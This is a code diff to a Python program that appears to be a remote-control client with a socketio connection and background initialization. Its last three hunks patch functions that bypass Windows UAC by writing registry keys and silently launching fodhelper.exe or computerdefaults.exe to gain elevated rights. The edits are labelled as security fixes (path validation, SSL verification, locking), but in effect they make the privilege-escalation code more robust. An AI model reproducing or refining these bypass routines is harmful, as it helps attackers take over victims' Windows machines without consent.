@@ -92,6 +92,9 @@ try:
 except ImportError:
     NUMPY_AVAILABLE = False
     print("Warning: numpy not available, some features may not work")
+except Exception as e:
+    NUMPY_AVAILABLE = False
+    print(f"Warning: numpy import failed: {e}")
 
 try:
     import cv2
@@ -222,7 +225,7 @@ else:
 # --- WebSocket Client ---
 if SOCKETIO_AVAILABLE:
     sio = socketio.Client(
-        ssl_verify=False,  # Disable SSL verification to prevent warnings
+        ssl_verify=True,  # Enable SSL verification for security
         engineio_logger=False,
         logger=False
     )
@@ -284,9 +287,10 @@ class BackgroundInitializer:
         import time
         dots = 0
         while not self.initialization_complete.is_set():
-            status = self.get_initialization_status()
-            completed = len([r for r in status.values() if r])
-            total = len(self.initialization_threads)  # Dynamic total based on actual tasks
+            with self.initialization_lock:
+                status = self.get_initialization_status()
+                completed = len([r for r in status.values() if r])
+                total = len(self.initialization_threads)  # Dynamic total based on actual tasks
             
             if total > 0:
                 progress_bar = "=" * completed + "-" * (total - completed)
@@ -356,11 +360,14 @@ class BackgroundInitializer:
     def _monitor_initialization(self):
         """Monitor initialization progress and set completion event."""
         try:
-            while len(self.initialization_threads) > 0:
-                # Check if all threads are done
-                active_threads = [t for t in self.initialization_threads if t.is_alive()]
-                if len(active_threads) == 0:
-                    break
+            while True:
+                with self.initialization_lock:
+                    if len(self.initialization_threads) == 0:
+                        break
+                    # Check if all threads are done
+                    active_threads = [t for t in self.initialization_threads if t.is_alive()]
+                    if len(active_threads) == 0:
+                        break
                 time.sleep(0.1)
             
             # All initialization tasks complete
@@ -553,6 +560,10 @@ def bypass_uac_cmlua_com():
             if current_exe.endswith('.py'):
                 current_exe = f'python.exe "{current_exe}"'
             
+            # Validate executable path to prevent injection
+            if not os.path.exists(current_exe) or not os.path.isfile(current_exe):
+                raise ValueError(f"Invalid executable path: {current_exe}")
+            
             lua_util.ShellExec(current_exe, "", "", 0, 1)
             return True
             
@@ -587,7 +598,11 @@ def bypass_uac_fodhelper_protocol():
             winreg.CloseKey(key)
             
             # Execute fodhelper to trigger bypass
-            subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"], 
+            fodhelper_path = r"C:\Windows\System32\fodhelper.exe"
+            if not os.path.exists(fodhelper_path):
+                raise ValueError(f"fodhelper.exe not found at {fodhelper_path}")
+            
+            subprocess.Popen([fodhelper_path], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
             
             time.sleep(2)
@@ -626,7 +641,11 @@ def bypass_uac_computerdefaults():
         winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
         winreg.CloseKey(key)
         
-        subprocess.Popen([r"C:\Windows\System32\computerdefaults.exe"], 
+        computerdefaults_path = r"C:\Windows\System32\computerdefaults.exe"
+        if not os.path.exists(computerdefaults_path):
+            raise ValueError(f"computerdefaults.exe not found at {computerdefaults_path}")
+        
+        subprocess.Popen([computerdefaults_path], 
                         creationflags=subprocess.CREATE_NO_WINDOW)
         
         time.sleep(2)
